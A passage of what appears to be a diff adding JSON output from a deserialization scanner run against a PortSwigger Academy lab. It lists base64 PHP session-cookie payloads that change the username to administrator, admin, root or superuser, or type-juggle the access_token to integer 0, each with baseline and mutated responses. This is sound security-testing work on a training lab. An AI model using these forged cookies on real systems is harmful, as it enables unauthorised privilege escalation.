+            "Response content differs in a small, localized way despite same status (similarity=0.89) (baseline='<!DOCTYPE html>\\n<html>\\n<!--LAB_HEAD_START-->\\n    <head>\\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\\n        <link href=/resources/css/labs.css rel=stylesheet>\\n    ' mutated='<!DOCTYPE html>\\n<html>\\n<!--LAB_HEAD_START-->\\n    <head>\\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\\n        <link href=/resources/css/labs.css rel=stylesheet>\\n    ')"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab",
+            "length": 3239,
+            "status": 200
+          },
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9",
+          "payload_type": "type_juggle_privesc"
+        }
+      ],
+      "confidence": "High",
+      "confirmation_status": "Suspected",
+      "exploit_type": "Privilege Escalation — String Manipulation",
+      "indicators": [
+        "Status code changed: baseline=200 mutated=500"
+      ],
+      "likely_vulnerable": true,
+      "location": "cookie",
+      "method": "GET",
+      "mutations_count": 10,
+      "name": "session",
+      "normalized": [
+        "O:4:\"User\":2:{s:8:\"username\";s:6:\"wiener\";s:12:\"access_token\";s:32:\"d9n6c5zwx1kuf8eulrdqn2bzi0dqo80w\";}"
+      ],
+      "notes": "String field detected — try changing role/privilege value",
+      "severity": "Medium",
+      "severity_note": null,
+      "subtype": null,
+      "suggested_probe": "modify_string",
+      "type": "PHP",
+      "url": "https://0a7b00d30427702480d15db7009f0032.web-security-academy.net/my-account?id=wiener"
+    },
+    {
+      "attempts": [
+        {
+          "baseline": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab",
+            "length": 3312,
+            "status": 200
+          },
+          "chain": null,
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class=link",
+            "length": 2847,
+            "status": 500
+          },
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO3M6MzI6ImQ5bjZjNXp3eDFrdWY4ZXVscmRxbjJiemkwZHFvODB3Ijt9",
+          "payload_type": "modify_string"
+        },
+        {
+          "baseline": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab",
+            "length": 3312,
+            "status": 200
+          },
+          "chain": null,
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class=link",
+            "length": 2563,
+            "status": 500
+          },
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO3M6MzI6ImQ5bjZjNXp3eDFrdWY4ZXVscmRxbjJiemkwZHFvODB3Ijt9",
+          "payload_type": "modify_string"
+        },
+        {
+          "baseline": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab",
+            "length": 3312,
+            "status": 200
+          },
+          "chain": null,
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class=link",
+            "length": 2562,
+            "status": 500
+          },
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjQ6InJvb3QiO3M6MTI6ImFjY2Vzc190b2tlbiI7czozMjoiZDluNmM1end4MWt1ZjhldWxyZHFuMmJ6aTBkcW84MHciO30=",
+          "payload_type": "modify_string"
+        },
+        {
+          "baseline": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab",
+            "length": 3312,
+            "status": 200
+          },
+          "chain": null,
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class=link",
+            "length": 2567,
+            "status": 500
+          },
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjk6InN1cGVydXNlciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJkOW42YzV6d3gxa3VmOGV1bHJkcW4yYnppMGRxbzgwdyI7fQ==",
+          "payload_type": "modify_string"
+        },
+        {
+          "baseline": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab",
+            "length": 3312,
+            "status": 200
+          },
+          "chain": null,
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class=link",
+            "length": 2821,
+            "status": 500
+          },
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjt9",
+          "payload_type": "modify_string"
+        },
+        {
+          "baseline": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab",
+            "length": 3312,
+            "status": 200
+          },
+          "chain": null,
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class=link",
+            "length": 2813,
+            "status": 500
+          },
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjU6ImFkbWluIjt9",
+          "payload_type": "modify_string"
+        },
+        {
+          "baseline": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab",
+            "length": 3312,
+            "status": 200
+          },
+          "chain": null,
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class=link",
+            "length": 2812,
+            "status": 500
+          },
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjQ6InJvb3QiO30=",
+          "payload_type": "modify_string"
+        },
+        {
+          "baseline": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab",
+            "length": 3312,
+            "status": 200
+          },
+          "chain": null,
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class=link",
+            "length": 2817,
+            "status": 500
+          },
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjk6InN1cGVydXNlciI7fQ==",
+          "payload_type": "modify_string"
+        },
+        {
+          "baseline": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab",
+            "length": 3312,
+            "status": 200
+          },
+          "chain": "access_token->i:0",
+          "indicators": [
+            "Observation: response length changed by +69 bytes (baseline=3312 mutated=3381, same status 200) — possible behavioral change, verify manually",
+            "Response content differs in a small, localized way despite same status (similarity=0.99) (baseline='<!DOCTYPE html>\\n<html>\\n<!--LAB_HEAD_START-->\\n    <head>\\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\\n        <link href=/resources/css/labs.css rel=stylesheet>\\n    ' mutated='<!DOCTYPE html>\\n<html>\\n<!--LAB_HEAD_START-->\\n    <head>\\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\\n        <link href=/resources/css/labs.css rel=stylesheet>\\n    ')"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab",
+            "length": 3381,
+            "status": 200
+          },
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtpOjA7fQ==",
+          "payload_type": "type_juggle"
+        },
+        {
+          "baseline": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab",
+            "length": 3312,
+            "status": 200
+          },
+          "chain": "username=administrator + access_token=i:0",
+          "indicators": [
+            "Observation: response length changed by -73 bytes (baseline=3312 mutated=3239, same status 200) — possible behavioral change, verify manually",
+            "Response content differs in a small, localized way despite same status (similarity=0.89) (baseline='<!DOCTYPE html>\\n<html>\\n<!--LAB_HEAD_START-->\\n    <head>\\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\\n        <link href=/resources/css/labs.css rel=stylesheet>\\n    ' mutated='<!DOCTYPE html>\\n<html>\\n<!--LAB_HEAD_START-->\\n    <head>\\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\\n        <link href=/resources/css/labs.css rel=stylesheet>\\n    ')"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab",
+            "length": 3239,
+            "status": 200
+          },
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9",
+          "payload_type": "type_juggle_privesc"
+        }
+      ],
+      "confidence": "High",
+      "confirmation_status": "Suspected",
+      "exploit_type": "Privilege Escalation — String Manipulation",
+      "indicators": [
+        "Status code changed: baseline=200 mutated=500"
+      ],
+      "likely_vulnerable": true,
+      "location": "cookie",
+      "method": "GET",
+      "mutations_count": 10,
+      "name": "session",
+      "normalized": [
+        "O:4:\"User\":2:{s:8:\"username\";s:6:\"wiener\";s:12:\"access_token\";s:32:\"d9n6c5zwx1kuf8eulrdqn2bzi0dqo80w\";}"
+      ],
+      "notes": "String field detected — try changing role/privilege value",
+      "severity": "Medium",
+      "severity_note": null,
+      "subtype": null,
+      "suggested_probe": "modify_string",
+      "type": "PHP",
+      "url": "https://0a7b00d30427702480d15db7009f0032.web-security-academy.net/my-account?id=wiener"
+    },
+    {
+      "attempts": [
+        {
+          "baseline": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labsEcommerce.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/explo",
+            "length": 10733,
+            "status": 200
+          },
+          "chain": null,
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Response length changed significantly: baseline=10733 mutated=2749"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab-deserializ",
+            "length": 2749,
+            "status": 500
+          },
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO3M6MzI6ImQ5bjZjNXp3eDFrdWY4ZXVscmRxbjJiemkwZHFvODB3Ijt9",
+          "payload_type": "modify_string"
+        },
+        {
+          "baseline": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labsEcommerce.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/explo",
+            "length": 10733,
+            "status": 200
+          },
+          "chain": null,
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Response length changed significantly: baseline=10733 mutated=2465"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab-deserializ",
+            "length": 2465,
+            "status": 500
+          },
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO3M6MzI6ImQ5bjZjNXp3eDFrdWY4ZXVscmRxbjJiemkwZHFvODB3Ijt9",
+          "payload_type": "modify_string"
+        },
+        {
+          "baseline": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labsEcommerce.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/explo",
+            "length": 10733,
+            "status": 200
+          },
+          "chain": null,
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Response length changed significantly: baseline=10733 mutated=2464"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab-deserializ",
+            "length": 2464,
+            "status": 500
+          },
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjQ6InJvb3QiO3M6MTI6ImFjY2Vzc190b2tlbiI7czozMjoiZDluNmM1end4MWt1ZjhldWxyZHFuMmJ6aTBkcW84MHciO30=",
+          "payload_type": "modify_string"
+        },
+        {
+          "baseline": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labsEcommerce.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/explo",
+            "length": 10733,
+            "status": 200
+          },
+          "chain": null,
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Response length changed significantly: baseline=10733 mutated=2469"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
